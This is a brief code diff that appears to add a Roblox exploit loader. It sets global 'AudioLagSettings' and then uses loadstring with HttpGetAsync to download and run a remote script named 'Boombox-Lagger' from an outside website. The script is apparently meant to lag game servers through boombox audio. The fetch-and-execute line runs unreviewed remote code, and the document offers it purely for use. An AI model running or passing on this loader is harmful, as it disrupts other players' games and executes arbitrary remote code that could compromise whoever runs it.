@@ -1,0 +1,6 @@
+_G.AudioLagSettings = {
+   Enabled = true,
+   Timer = 1.8,
+}
+
+loadstring(game:HttpGetAsync('https://cheems.website/scripts/Boombox-Lagger'))()
